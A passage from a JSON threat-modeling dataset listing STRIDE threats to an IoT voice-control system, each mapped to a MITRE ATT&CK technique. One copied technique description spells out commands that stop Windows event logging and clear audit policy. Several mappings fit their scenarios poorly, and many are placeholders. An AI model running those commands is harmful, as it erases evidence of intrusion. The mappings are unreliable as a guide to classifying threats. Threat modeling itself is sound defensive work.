            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "IoT devices",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates data stored in the cloud services, affecting future application behaviors.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has credentials or access methods to the cloud services.",
                    "Role": "Attacker",
                    "Condition": "Cloud service authentication and access control are somehow compromised."
                },
                {
                    "Assumption": "Sensitive data is not encrypted or integrity-protected.",
                    "Role": "System Designer",
                    "Condition": "The cloud data lacks encryption and tamper-evident mechanisms."
                },
                {
                    "Assumption": "Cloud service logs and events are not monitored adequately.",
                    "Role": "System Administrator",
                    "Condition": "Irregularities in data access and modification are not detected promptly."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to potential alteration of service functionality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud services",
                "data manipulation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending unauthorized control commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The application lacks a robust logging mechanism.",
                    "Role": "System Designer",
                    "Condition": "Logs that track user actions and commands are incomplete or missing."
                },
                {
                    "Assumption": "Command history is not securely stored or encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Command history can be tampered with or deleted."
                },
                {
                    "Assumption": "No non-repudiation measures are in place.",
                    "Role": "System Designer",
                    "Condition": "There are no mechanisms to ensure actions are associated with their initiators."
                }
            ],
            "Potential Impact": "Data integrity compromised as actions are not traceable to actual users.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "IoT devices",
                "unauthorized commands",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies manipulating sensitive data stored in cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service does not maintain tamper-evident logs of data modifications.",
                    "Role": "System Designer",
                    "Condition": "Logs are inadequate for tracking and verifying data changes."
                },
                {
                    "Assumption": "Security measures do not ensure the integrity of log files.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered or deleted undetected."
                },
                {
                    "Assumption": "No multi-factor authentication for sensitive operations.",
                    "Role": "System Designer",
                    "Condition": "Critical operations can be performed without strong authentication."
                }
            ],
            "Potential Impact": "Confidentiality and integrity compromised, as unauthorized changes to data cannot be traced.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "data manipulation",
                "log integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies attempting a failed login to client-side applications.",
            "Assumptions": [
                {
                    "Assumption": "The application does not log failed login attempts in detail.",
                    "Role": "System Designer",
                    "Condition": "The logging of failed access attempts is insufficient or non-existent."
                },
                {
                    "Assumption": "Access logs are not secured.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered, erased, or are inaccessible for verification."
                },
                {
                    "Assumption": "No monitoring of failed logins indicating potential attack.",
                    "Role": "System Administrator",
                    "Condition": "No alerts or monitoring tools are in place for login irregularities."
                }
            ],
            "Potential Impact": "Data integrity compromised, making it harder to trace attack origins.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "client-side application",
                "login attempt",
                "logging insufficiency"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive conversations are intercepted when transmitted from the microphone to the server.",
            "Assumptions": [
                {
                    "Assumption": "Network communication is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Data is transmitted in plaintext without encryption."
                },
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network sniffing capabilities."
                },
                {
                    "Assumption": "Sensitive data classification not enforced.",
                    "Role": "System Designer",
                    "Condition": "Sensitive voice data is not marked or handled properly in transmission."
                }
            ],
            "Potential Impact": "Confidentiality breached, compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network sniffing",
                "voice commands",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized third party gains access to data stored in the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Stored data is not protected by strong encryption."
                },
                {
                    "Assumption": "The attacker has access credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or leaked."
                },
                {
                    "Assumption": "No monitoring for suspicious access patterns.",
                    "Role": "System Administrator",
                    "Condition": "Unusual access is not detected or reported."
                }
            ],
            "Potential Impact": "Confidentiality compromised, exposing sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "unauthorized access",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive control data between client-side application and IoT controller is intercepted.",
            "Assumptions": [
                {
                    "Assumption": "Control data is transmitted without encryption.",
                    "Role": "System Designer",
                    "Condition": "Data is sent in plaintext."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "The network is compromised or not adequately secured."
                },
                {
                    "Assumption": "No secure protocols in use for sensitive data.",
                    "Role": "System Designer",
                    "Condition": "Data transmission lacks secure protocols like HTTPS."
                }
            ],
            "Potential Impact": "Confidentiality breached, exposing control commands.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "client-side application",
                "IoT controller",
                "unencrypted command"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server with a massive number of voice commands, overwhelming the system.",
            "Assumptions": [
                {
                    "Assumption": "The application does not rate-limit incoming requests.",
                    "Role": "System Designer",
                    "Condition": "There are no checks to limit the number of requests handled by the system."
                },
                {
                    "Assumption": "Server resources are finite and can be exhausted.",
                    "Role": "System Designer",
                    "Condition": "System resources are not sufficient to handle excessive load."
                },
                {
                    "Assumption": "Attack originates from one or more compromised devices.",
                    "Role": "Attacker",
                    "Condition": "The attacker can control multiple devices to flood the service."
                }
            ],
            "Potential Impact": "Availability affected, denying legitimate users access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server overload",
                "voice commands",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the network infrastructure connecting IoT devices to the controller with massive data packets to cause a network outage.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure is vulnerable to high traffic.",
                    "Role": "System Designer",
                    "Condition": "The network cannot handle excessive data traffic."
                },
                {
                    "Assumption": "No protective measures like firewalls are in place to control traffic.",
                    "Role": "System Administrator",
                    "Condition": "The network is inadequately protected."
                },
                {
                    "Assumption": "Attack vectors are known and exploitable by echoing or amplifying requests.",
                    "Role": "Attacker",
                    "Condition": "The attacker has knowledge of how to exploit network weaknesses."
                }
            ],
            "Potential Impact": "Availability of IoT device control compromised, preventing command execution.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network infrastructure",
                "IoT controller",
                "traffic flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker compromises and disables the cloud services, halting dependent application functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack adequate resilience mechanisms.",
                    "Role": "Service Provider",
                    "Condition": "Cloud services do not implement redundancy or failover solutions."
                },
                {
                    "Assumption": "The attacker has the means to exploit cloud service vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities in cloud services are known."
                },
                {
                    "Assumption": "No mitigation plan is in place for cloud service downtime.",
                    "Role": "System Administrator",
                    "Condition": "There is no strategy to handle cloud disruptions."
                }
            ],
            "Potential Impact": "Availability severely compromised, disabling dependent functionalities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "application functionality",
                "service exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The application has known or zero-day vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Vulnerabilities present in the application codebase or framework."
                },
                {
                    "Assumption": "The attacker has the skill to exploit vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker is knowledgeable about exploiting application flaws."
                },
                {
                    "Assumption": "Permissions and roles are inadequately managed.",
                    "Role": "System Designer",
                    "Condition": "The application does not properly enforce least privilege access."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability compromised by unauthorized administrative control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "client-side application",
                "administrative access",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to the IoT controller, bypassing standard user permissions.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has exploitable firmware or software bugs.",
                    "Role": "System Designer",
                    "Condition": "The controller firmware or software is vulnerable."
                },
                {
                    "Assumption": "No robust authentication mechanisms are in place.",
                    "Role": "System Designer",
                    "Condition": "Weak or default authentication methods are used."
                },
                {
                    "Assumption": "The attacker has network access to target the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "The controller network is inadequately secured."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability compromised by elevated control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "IoT controller",
                "root access",
                "network exploitation"
            ],
            "mitre_technique": {
                "name": "SSH Hijacking",
                "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "id": "attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8",
                "technique_id": "T1563.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages cloud misconfigurations to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Cloud configurations are mismanaged or improper.",
                    "Role": "System Administrator",
                    "Condition": "Cloud administrative roles and permissions are not correctly set."
                },
                {
                    "Assumption": "Cloud services are not regularly audited for security risks.",
                    "Role": "System Administrator",
                    "Condition": "No regular security audits are conducted."
                },
                {
                    "Assumption": "No multi-factor authentication is implemented for privileged actions.",
                    "Role": "System Designer",
                    "Condition": "Critical actions lack additional authentication layers."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability compromised by unauthorized administrative access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "administrative privileges",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker hijacks the microphone to impersonate a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the microphone.",
                    "Role": "Attacker",
                    "Condition": "Physical presence near the device"
                },
                {
                    "Assumption": "The application lacks robust user authentication mechanisms.",
                    "Role": "Application Architect",
                    "Condition": "Absence of sophisticated authentication methods"
                },
                {
                    "Assumption": "The system does not perform voice recognition.",
                    "Role": "System Designer",
                    "Condition": "Dependency on basic input capture"
                }
            ],
            "Potential Impact": "Unauthorized actions performed via voice commands.",
            "MITRE ATT&CK Keywords": [
                "voice impersonation",
                "microphone hijacking",
                "input spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates network traffic to insert malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to intercept or manipulate network communications.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "The system does not verify the origin of commands.",
                    "Role": "Developer",
                    "Condition": "Insufficient command validation"
                }
            ],
            "Potential Impact": "Malicious commands executed on IoT devices.",
            "MITRE ATT&CK Keywords": [
                "network traffic manipulation",
                "command injection",
                "network spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A rogue device impersonates an IoT device to connect to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the network.",
                    "Role": "Attacker",
                    "Condition": "Proximity to network infrastructure"
                },
                {
                    "Assumption": "Network devices are not authenticated before connection.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of device authentication"
                },
                {
                    "Assumption": "The system trusts all devices on the network.",
                    "Role": "System Designer",
                    "Condition": "Implicit trust model"
                }
            ],
            "Potential Impact": "Unauthorized devices gain network access.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "rogue device",
                "network intrusion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious firmware update sent to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or send firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Access to firmware update mechanism"
                },
                {
                    "Assumption": "Firmware updates are not signed.",
                    "Role": "Firmware Developer",
                    "Condition": "Absence of cryptographic signatures"
                },
                {
                    "Assumption": "IoT devices do not validate firmware integrity.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Lack of integrity checking"
                }
            ],
            "Potential Impact": "Corruption of IoT device functionality.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "malicious update",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Hardware Supply Chain",
                "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
                "id": "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef",
                "technique_id": "T1195.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Network packets altered in transit.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the network.",
                    "Role": "Attacker",
                    "Condition": "Network penetration"
                },
                {
                    "Assumption": "The network lacks transport layer security.",
                    "Role": "Network Engineer",
                    "Condition": "Unprotected network traffic"
                },
                {
                    "Assumption": "Systems do not verify the integrity of received data.",
                    "Role": "Developer",
                    "Condition": "No end-to-end data verification"
                }
            ],
            "Potential Impact": "Commands and data corrupted during transmission.",
            "MITRE ATT&CK Keywords": [
                "packet tampering",
                "network traffic alteration",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Client-side application manipulated by user.",
            "Assumptions": [
                {
                    "Assumption": "The user has access to the device running the client application.",
                    "Role": "User",
                    "Condition": "Device ownership"
                },
                {
                    "Assumption": "The application code can be modified.",
                    "Role": "Developer",
                    "Condition": "Unprotected client code"
                },
                {
                    "Assumption": "The system relies heavily on client-side logic.",
                    "Role": "System Designer",
                    "Condition": "Critical client-side functions"
                }
            ],
            "Potential Impact": "Unauthorized control and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "client-side manipulation",
                "application tampering",
                "local device exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies issuing specific voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are not logged.",
                    "Role": "System Administrator",
                    "Condition": "Lack of command logging"
                },
                {
                    "Assumption": "User authentication is weak or non-existent.",
